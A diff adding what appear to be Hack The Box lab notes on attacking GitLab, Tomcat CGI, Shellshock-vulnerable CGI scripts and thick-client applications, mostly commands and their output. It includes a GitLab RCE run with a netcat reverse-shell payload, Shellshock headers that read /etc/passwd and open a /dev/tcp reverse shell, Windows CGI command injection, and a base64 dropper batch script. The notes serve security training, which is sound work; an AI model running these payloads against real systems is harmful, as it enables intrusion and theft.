@@ -1205,110 +1205,488 @@ http://gitlab.inlanefreight.local:8081/root/inlanefreight-dev
 mdmithu@htb[/htb]$ http://gitlab.inlanefreight.local:8081/explore
 
 ```
-```
-1
-```
-```
-1
-```
-```
-1
-```
-```
-1
-```
-```
-1
-```
-```
-1
-```
-```
-1
-```
-```
-1
-```
-```
-1
-```
-```
-1
-```
-```
-1
-```
-```
-1
-```
-```
-1
-```
-```
-1
-```
-```
-1
-```
-```
-1
-```
-```
-1
-```
-```
-1
-```
-```
-1
-```
-```
-1
-```
-```
-1
-```
-```
-1
-```
-```
-1
-```
-```
-1
-```
-```
-1
-```
-```
-1
-```
-```
-1
-```
-```
-1
-```
-```
-1
-```
-```
-1
-```
-```
-1
-```
-```
-1
-```
-```
-1
-```
-```
-1
-```
-```
-1
+## Attacking GitLab
+
+```
+mdmithu@htb[/htb]$ ./gitlab_userenum.sh --url http://gitlab.inlanefreight.local:8081/ --userlist users.txt
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+                         GitLab User Enumeration Script
+                                 Version 1.0
+
+Description: It prints out the usernames that exist in your victim's GitLab CE instance
+
+Disclaimer: Do not run this script against GitLab.com! Also keep in mind that this PoC is meant only
+for educational purpose and ethical use. Running it against systems that you do not own or have the
+right permission is totally on your own risk.
+
+Author: @4DoniiS [https://github.com/4D0niiS]
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+
+LOOP
+200
+[+] The username root exists!
+LOOP
+302
+LOOP
+302
+LOOP
+200
+[+] The username bob exists!
+LOOP
+302
+
+```
+```
+mdmithu@htb[/htb]$ python3 gitlab_13_10_2_rce.py -t http://gitlab.inlanefreight.local:8081 -u mrb3n -p password1 -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.15 8443 >/tmp/f '
+
+[1] Authenticating
+Successfully Authenticated
+[2] Creating Payload 
+[3] Creating Snippet and Uploading
+[+] RCE Triggered !!
+```
+```
+mdmithu@htb[/htb]$ nc -lnvp 8443
+
+listening on [any] 8443 ...
+connect to [10.10.14.15] from (UNKNOWN) [10.129.201.88] 60054
+
+git@app04:~/gitlab-workhorse$ id
+
+id
+uid=996(git) gid=997(git) groups=997(git)
+
+git@app04:~/gitlab-workhorse$ ls
+
+ls
+VERSION
+config.toml
+flag_gitlab.txt
+sockets
+```
+## Attacking Tomcat CGI
+
+```
+http://example.com/cgi-bin/booksearch.cgi?action=title&query=the+great+gatsby
+http://example.com/cgi-bin/booksearch.cgi?action=author&query=fitzgerald
+
+```
+#### Enumeration
+```
+mdmithu@htb[/htb]$ nmap -p- -sC -Pn 10.129.204.227 --open 
+
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-23 13:57 SAST
+Nmap scan report for 10.129.204.227
+Host is up (0.17s latency).
+Not shown: 63648 closed tcp ports (conn-refused), 1873 filtered tcp ports (no-response)
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT      STATE SERVICE
+22/tcp    open  ssh
+| ssh-hostkey: 
+|   2048 ae19ae07ef79b7905f1a7b8d42d56099 (RSA)
+|   256 382e76cd0594a6e717d1808165262544 (ECDSA)
+|_  256 35096912230f11bc546fddf797bd6150 (ED25519)
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+445/tcp   open  microsoft-ds
+5985/tcp  open  wsman
+8009/tcp  open  ajp13
+| ajp-methods: 
+|_  Supported methods: GET HEAD POST OPTIONS
+8080/tcp  open  http-proxy
+|_http-title: Apache Tomcat/9.0.17
+|_http-favicon: Apache Tomcat
+47001/tcp open  winrm
+
+Host script results:
+| smb2-time: 
+|   date: 2023-03-23T11:58:42
+|_  start_date: N/A
+| smb2-security-mode: 
+|   311: 
+|_    Message signing enabled but not required
+
+Nmap done: 1 IP address (1 host up) scanned in 165.25 seconds
+```
+```
+mdmithu@htb[/htb]$ ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.204.227:8080/cgi/FUZZ.cmd
+
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__/\ /\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          /_/    /_/   /___/    /_/       
+
+       v2.0.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://10.129.204.227:8080/cgi/FUZZ.cmd
+ :: Wordlist         : FUZZ: /usr/share/dirb/wordlists/common.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
+________________________________________________
+
+:: Progress: [4614/4614] :: Job [1/1] :: 223 req/sec :: Duration: [0:00:20] :: Errors: 0 ::
+
+```
+```
+mdmithu@htb[/htb]$ ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.204.227:8080/cgi/FUZZ.bat
+
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__/\ /\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          /_/    /_/   /___/    /_/       
+
+       v2.0.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://10.129.204.227:8080/cgi/FUZZ.bat
+ :: Wordlist         : FUZZ: /usr/share/dirb/wordlists/common.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
+________________________________________________
+
+[Status: 200, Size: 81, Words: 14, Lines: 2, Duration: 234ms]
+    * FUZZ: welcome
+
+:: Progress: [4614/4614] :: Job [1/1] :: 226 req/sec :: Duration: [0:00:20] :: Errors: 0 ::
+
+```
+```
+mdmithu@htb[/htb]$ http://10.129.204.227:8080/cgi/welcome.bat?&dir
+# http://10.129.204.227:8080/cgi/welcome.bat?&set
+
+Welcome to CGI, this section is not functional yet. Please return to home page.
+AUTH_TYPE=
+COMSPEC=C:\Windows\system32\cmd.exe
+CONTENT_LENGTH=
+CONTENT_TYPE=
+GATEWAY_INTERFACE=CGI/1.1
+HTTP_ACCEPT=text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+HTTP_ACCEPT_ENCODING=gzip, deflate
+HTTP_ACCEPT_LANGUAGE=en-US,en;q=0.5
+HTTP_HOST=10.129.204.227:8080
+HTTP_USER_AGENT=Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+PATHEXT=.COM;.EXE;.BAT;.CMD;.VBS;.JS;.WS;.MSC
+PATH_INFO=
+PROMPT=$P$G
+QUERY_STRING=&set
+REMOTE_ADDR=10.10.14.58
+REMOTE_HOST=10.10.14.58
+REMOTE_IDENT=
+```
+```
+mdmithu@htb[/htb]$ http://10.129.204.227:8080/cgi/welcome.bat?&c:\windows\system32\whoami.exe
+mdmithu@htb[/htb]$ http://10.129.204.227:8080/cgi/welcome.bat?&c%3A%5Cwindows%5Csystem32%5Cwhoami.exe
+
+```
+## Attacking Common Gateway Interface (CGI) Applications - Shellshock
+
+```
+$ env y='() { :;}; echo vulnerable-shellshock' bash -c "echo not vulnerable"
+```
+```
+$ env y='() { :;}; echo vulnerable-shellshock' bash -c "echo not vulnerable"
+
+not vulnerable
+```
+```
+mdmithu@htb[/htb]$ gobuster dir -u http://10.129.204.231/cgi-bin/ -w /usr/share/wordlists/dirb/small.txt -x cgi
+
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.129.204.231/cgi-bin/
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirb/small.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Extensions:              cgi
+[+] Timeout:                 10s
+===============================================================
+2023/03/23 09:26:04 Starting gobuster in directory enumeration mode
+===============================================================
+/access.cgi           (Status: 200) [Size: 0]
+                                             
+===============================================================
+2023/03/23 09:26:29 Finished
+
+```
+```
+mdmithu@htb[/htb]$ curl -i http://10.129.204.231/cgi-bin/access.cgi
+
+HTTP/1.1 200 OK
+Date: Thu, 23 Mar 2023 13:28:55 GMT
+Server: Apache/2.4.41 (Ubuntu)
+Content-Length: 0
+Content-Type: text/html
+```
+```
+mdmithu@htb[/htb]$ curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' bash -s :'' http://10.129.204.231/cgi-bin/access.cgi
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
+syslog:x:104:110::/home/syslog:/usr/sbin/nologin
+_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
+tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
+uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
+tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
+landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
+pollinate:x:110:1::/var/cache/pollinate:/bin/false
+sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
+systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
+ftp:x:112:119:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
+kim:x:1000:1000:,,,:/home/kim:/bin/bash
+
+```
+```
+mdmithu@htb[/htb]$ curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.14.38/7777 0>&1' http://10.129.204.231/cgi-bin/access.cgi
+```
+```
+mdmithu@htb[/htb]$ sudo nc -lvnp 7777
+
+listening on [any] 7777 ...
+connect to [10.10.14.38] from (UNKNOWN) [10.129.204.231] 52840
+bash: cannot set terminal process group (938): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@htb:/usr/lib/cgi-bin$ id
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+www-data@htb:/usr/lib/cgi-bin$
+
+```
+## Attacking Thick Client Applications
+
+```
+C:\Apps>.\Restart-OracleService.exe
+C:\Apps>
+
+```
+```
+C:\Apps>dir C:\Users\cybervaca\AppData\Local\Temp\2
+
+...SNIP...
+04/03/2023  02:09 PM         1,730,212 6F39.bat
+04/03/2023  02:09 PM                 0 6F39.tmp
+```
+```
+@shift /0
+@echo off
+
+if %username% == matt goto correcto
+if %username% == frankytech goto correcto
+if %username% == ev4si0n goto correcto
+goto error
+
+:correcto
+echo TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA > c:\programdata\oracle.txt
+echo AAAAAAAAAAgAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4g >> c:\programdata\oracle.txt
+<SNIP>
+echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> c:\programdata\oracle.txt
+
+echo $salida = $null; $fichero = (Get-Content C:\ProgramData\oracle.txt) ; foreach ($linea in $fichero) {$salida += $linea }; $salida = $salida.Replace(" ",""); [System.IO.File]::WriteAllBytes("c:\programdata\restart-service.exe", [System.Convert]::FromBase64String($salida)) > c:\programdata\monta.ps1
+powershell.exe -exec bypass -file c:\programdata\monta.ps1
+del c:\programdata\monta.ps1
+del c:\programdata\oracle.txt
+c:\programdata\restart-service.exe
+del c:\programdata\restart-service.exe
+```
+```
+@shift /0
+@echo off
+
+echo TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA > c:\programdata\oracle.txt
+echo AAAAAAAAAAgAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4g >> c:\programdata\oracle.txt
+<SNIP>
+echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> c:\programdata\oracle.txt
+
+echo $salida = $null; $fichero = (Get-Content C:\ProgramData\oracle.txt) ; foreach ($linea in $fichero) {$salida += $linea }; $salida = $salida.Replace(" ",""); [System.IO.File]::WriteAllBytes("c:\programdata\restart-service.exe", [System.Convert]::FromBase64String($salida)) > c:\programdata\monta.ps1
+```
+```
+C:\>  cat C:\programdata\monta.ps1
+
+$salida = $null; $fichero = (Get-Content C:\ProgramData\oracle.txt) ; foreach ($linea in $fichero) {$salida += $linea }; $salida = $salida.Replace(" ",""); [System.IO.File]::WriteAllBytes("c:\programdata\restart-service.exe", [System.Convert]::FromBase64String($salida))
+
+```
+```
+C:\>  ls C:\programdata\
+
+Mode                LastWriteTime         Length Name
+<SNIP>
+-a----        3/24/2023   1:01 PM            273 monta.ps1
+-a----        3/24/2023   1:01 PM         601066 oracle.txt
+-a----        3/24/2023   1:17 PM         432273 restart-service.exe
+```
+```
+C:\>  .\restart-service.exe
+
+    ____            __             __     ____                  __
+   / __ \___  _____/ /_____ ______/ /_   / __ \_________ ______/ /__
+  / /_/ / _ / ___/ __/ __ `/ ___/ __/  / / / / ___/ __ `/ ___/ / _ \
+ / _, _/  __(__  ) /_/ /_/ / /  / /_   / /_/ / /  / /_/ / /__/ /  __/
+/_/ |_|\___/____/\__/\__,_/_/   \__/   \____/_/   \__,_/\___/_/\___/
+
+                                                by @HelpDesk 2010
+
+
+PS C:\ProgramData>
+
+```
+```
+C:\> C:\TOOLS\Strings\strings64.exe .\restart-service_00000000001E0000.bin
+
+<SNIP>
+"#M
+z\V
+).NETFramework,Version=v4.0,Profile=Client
+FrameworkDisplayName
+.NET Framework 4 Client Profile
+<SNIP>
+
+```
+```
+de4dot v3.1.41592.3405
+
+Detected Unknown Obfuscator (C:\Users\cybervaca\Desktop\restart-service_00000000001E0000.bin)
+Cleaning C:\Users\cybervaca\Desktop\restart-service_00000000001E0000.bin
+Renaming all obfuscated symbols
+Saving C:\Users\cybervaca\Desktop\restart-service_00000000001E0000-cleaned.bin
+
+
+Press any key to exit...
+```
+## Exploiting Web Vulnerabilities in Thick-Client Applications
+
+```
+C:\> echo 10.10.10.174    server.fatty.htb >> C:\Windows\System32\drivers\etc\hosts
+```
+```
+C:\> ls fatty-client\
+
+<SNIP>
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----       10/30/2019  12:10 PM                htb
+d-----       10/30/2019  12:10 PM                META-INF
+d-----        4/26/2017  12:09 AM                org
+------       10/30/2019  12:10 PM           1550 beans.xml
+------       10/30/2019  12:10 PM           2230 exit.png
+------       10/30/2019  12:10 PM           4317 fatty.p12
+------       10/30/2019  12:10 PM            831 log4j.properties
+------        4/26/2017  12:08 AM            299 module-info.class
+------       10/30/2019  12:10 PM          41645 spring-beans-3.0.xsd
+```
+```
+C:\> ls fatty-client\ -recurse | Select-String "8000" | Select Path, LineNumber | Format-List
+
+Path       : C:\Users\cybervaca\Desktop\fatty-client\beans.xml
+LineNumber : 13
+```
+```
+C:\> cat fatty-client\beans.xml
+
+<SNIP>
+<!-- Here we have an constructor based injection, where Spring injects required arguments inside the
+         constructor function. -->
+   <bean id="connectionContext" class = "htb.fatty.shared.connection.ConnectionContext">
+      <constructor-arg index="0" value = "server.fatty.htb"/>
+      <constructor-arg index="1" value = "8000"/>
+   </bean>
+
+<!-- The next to beans use setter injection. For this kind of injection one needs to define an default
+constructor for the object (no arguments) and one needs to define setter methods for the properties. -->
+   <bean id="trustedFatty" class = "htb.fatty.shared.connection.TrustedFatty">
+      <property name = "keystorePath" value = "fatty.p12"/>
+   </bean>
+
+   <bean id="secretHolder" class = "htb.fatty.shared.connection.SecretHolder">
+      <property name = "secret" value = "clarabibiclarabibiclarabibi"/>
+   </bean>
+<SNIP>
+```
+```
+C:\> cat fatty-client\META-INF\MANIFEST.MF
+
+Manifest-Version: 1.0
+Archiver-Version: Plexus Archiver
+Built-By: root
+Sealed: True
+Created-By: Apache Maven 3.3.9
+Build-Jdk: 1.8.0_232
+Main-Class: htb.fatty.client.run.Starter
+
+Name: META-INF/maven/org.slf4j/slf4j-log4j12/pom.properties
+SHA-256-Digest: miPHJ+Y50c4aqIcmsko7Z/hdj03XNhHx3C/pZbEp4Cw=
+
+Name: org/springframework/jmx/export/metadata/ManagedOperationParamete
+ r.class
+SHA-256-Digest: h+JmFJqj0MnFbvd+LoFffOtcKcpbf/FD9h2AMOntcgw=
+<SNIP>
+
+```
+```
+        powershell
+C:\> cd .\fatty-client
+C:\> jar -cmf .\META-INF\MANIFEST.MF ..\fatty-client-new.jar *
+```
+```
+C:\> mkdir raw
+C:\> cp fatty-client-new.jar raw\fatty-client-new-2.jar
+
+```
+```
+C:\> mv -Force fatty-client-new.jar.src\htb\fatty\client\gui\*.class raw\htb\fatty\client\gui\
+```
+```
+        powershell
+C:\> cd raw
+C:\> jar -cmf META-INF\MANIFEST.MF traverse.jar .
+```
+```
+C:\> ls C:\Users\cybervaca\Desktop\
+
+...SNIP...
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----        3/25/2023  11:38 AM       10827452 fatty-server.jar
 ```
 ```
 1
